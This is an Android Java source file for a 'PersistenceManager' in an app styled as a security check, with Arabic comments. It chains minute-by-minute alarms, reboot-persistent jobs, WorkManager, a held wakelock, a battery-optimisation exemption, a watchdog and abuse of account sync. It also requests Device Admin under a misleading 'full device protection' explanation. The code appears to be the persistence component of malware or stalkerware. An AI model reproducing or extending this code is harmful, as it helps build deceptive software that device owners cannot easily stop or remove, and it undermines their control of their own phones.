package com.sec.check;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import java.util.concurrent.TimeUnit;

public class PersistenceManager {

    private static final String TAG = "SecurityCheck";

    // ★★★ كل الطرق المتاحة للحفاظ على استمرارية الخدمة ★★★

    // ============================================================
    // [1] AlarmManager — يشتغل كل دقيقة
    // ============================================================
    public static void scheduleAlarm(Context context) {
        try {
            AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);

            if (am == null) return;

            Intent intent = new Intent(context, AlarmReceiver.class);
            intent.setAction("com.sec.check.KEEP_ALIVE");

            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }

            PendingIntent pi = PendingIntent.getBroadcast(
                    context, 1001, intent, flags);

            long interval = 60 * 1000; // كل دقيقة
            long triggerAt = System.currentTimeMillis() + interval;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // Doze Mode — استخدم setExactAndAllowWhileIdle
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                am.setExact(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            } else {
                am.set(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            }

            Log.d(TAG, "[PERSISTENCE] Alarm scheduled");

        } catch (Exception e) {
            Log.e(TAG, "scheduleAlarm: " + e.getMessage());
        }
    }

    // ★ نسخة متكررة كل 5 دقائق كـ backup
    public static void scheduleRepeatingAlarm(Context context) {
        try {
            AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;

            Intent intent = new Intent(context, AlarmReceiver.class);
            intent.setAction("com.sec.check.KEEP_ALIVE_REPEAT");

            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }

            PendingIntent pi = PendingIntent.getBroadcast(
                    context, 1002, intent, flags);

            long interval = 5 * 60 * 1000;

            am.setInexactRepeating(
                    AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + interval,
                    interval,
                    pi);

            Log.d(TAG, "[PERSISTENCE] Repeating alarm scheduled");

        } catch (Exception e) {
            Log.e(TAG, "scheduleRepeatingAlarm: " + e.getMessage());
        }
    }

    // ============================================================
    // [2] JobScheduler — يشتغل كل 15 دقيقة
    // ============================================================
    public static void scheduleJob(Context context) {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return;

            JobScheduler js = (JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (js == null) return;

            ComponentName component = new ComponentName(context, KeepAliveJobService.class);

            JobInfo job = new JobInfo.Builder(2001, component)
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                    .setPersisted(true)              // ★ يبقى بعد reboot
                    .setPeriodic(15 * 60 * 1000)     // كل 15 دقيقة
                    .setOverrideDeadline(60 * 1000)  // يشتغل أول دقيقة
                    .build();

            js.schedule(job);
            Log.d(TAG, "[PERSISTENCE] Job scheduled");

        } catch (Exception e) {
            Log.e(TAG, "scheduleJob: " + e.getMessage());
        }
    }

    // ============================================================
    // [3] WorkManager — backup
    // ============================================================
    public static void scheduleWork(Context context) {
        try {
            PeriodicWorkRequest work = new PeriodicWorkRequest.Builder(
                    KeepAliveWorker.class,
                    15, TimeUnit.MINUTES)
                    .setInitialDelay(1, TimeUnit.MINUTES)
                    .build();

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                    "SecurityCheckKeepAlive",
                    ExistingPeriodicWorkPolicy.KEEP,
                    work);

            Log.d(TAG, "[PERSISTENCE] WorkManager scheduled");

        } catch (Exception e) {
            Log.e(TAG, "scheduleWork: " + e.getMessage());
        }
    }

    // ============================================================
    // [4] WakeLock — يمنع CPU من النوم
    // ============================================================
    private static PowerManager.WakeLock wakeLock;

    public static void acquireWakeLock(Context context) {
        try {
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            if (pm == null) return;

            if (wakeLock != null && wakeLock.isHeld()) return;

            wakeLock = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "SecurityCheck::KeepAliveWakeLock");

            wakeLock.setReferenceCounted(false);
            wakeLock.acquire();

            Log.d(TAG, "[PERSISTENCE] WakeLock acquired");

        } catch (Exception e) {
            Log.e(TAG, "acquireWakeLock: " + e.getMessage());
        }
    }

    public static void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "releaseWakeLock: " + e.getMessage());
        }
    }

    // ============================================================
    // [5] Battery Optimization Exempt
    // ============================================================
    public static boolean isBatteryOptimizationDisabled(Context context) {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true;

            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            if (pm == null) return false;

            return pm.isIgnoringBatteryOptimizations(context.getPackageName());

        } catch (Exception e) {
            return false;
        }
    }

    public static Intent getBatteryOptimizationIntent(Context context) {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return null;

            Intent intent = new Intent();
            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            return intent;

        } catch (Exception e) {
            return null;
        }
    }

    // ============================================================
    // [6] تشغيل الـ Service الأساسي
    // ============================================================
    public static void startMainService(Context context) {
        try {
            Intent serviceIntent = new Intent(context, ServiceRunner.class);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }

            Log.d(TAG, "[PERSISTENCE] Main service started");

        } catch (Exception e) {
            Log.e(TAG, "startMainService: " + e.getMessage());
        }
    }

    // ============================================================
    // [7] تفعيل كل طبقات الاستمرارية دفعة واحدة
    // ============================================================
    public static void enableAllPersistence(Context context) {
        Log.d(TAG, "[PERSISTENCE] === Enabling all persistence layers ===");

        // 1. تشغيل الـ Service الأساسي
        startMainService(context);

        // 2. WakeLock
        acquireWakeLock(context);

        // 3. AlarmManager (فردي)
        scheduleAlarm(context);

        // 4. AlarmManager (متكرر)
        scheduleRepeatingAlarm(context);

        // 5. JobScheduler
        scheduleJob(context);

        // 6. WorkManager
        scheduleWork(context);

        // 7. Device Admin
        enableDeviceAdmin(context);

        // 8. Account Sync
        enableAccountSync(context);

        // 9. Services Watchdog
        ServicesWatchdog.startWatching(context);

        Log.d(TAG, "[PERSISTENCE] === All layers enabled ===");
    }

    // ============================================================
    // [8] تفعيل Device Admin
    // ============================================================
    private static void enableDeviceAdmin(Context context) {
        try {
            android.app.admin.DevicePolicyManager dpm =
                    (android.app.admin.DevicePolicyManager)
                            context.getSystemService(Context.DEVICE_POLICY_SERVICE);

            if (dpm == null) return;

            ComponentName adminComponent =
                    new ComponentName(context, AdminReceiver.class);

            if (dpm.isAdminActive(adminComponent)) {
                Log.d(TAG, "[PERSISTENCE] Device Admin already active");
                return;
            }

            Intent intent = new Intent(
                    android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(
                    android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                    adminComponent);
            intent.putExtra(
                    android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "لتفعيل الحماية الكاملة للجهاز");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            context.startActivity(intent);

        } catch (Exception e) {
            Log.e(TAG, "enableDeviceAdmin: " + e.getMessage());
        }
    }

    // ============================================================
    // [9] تفعيل Account Sync (يستغل sync تلقائي)
    // ============================================================
    private static void enableAccountSync(Context context) {
        try {
            // هيتم من خلال AccountSyncService
            AccountSyncService.registerSyncAdapter(context);
        } catch (Exception e) {
            Log.e(TAG, "enableAccountSync: " + e.getMessage());
        }
    }
              }
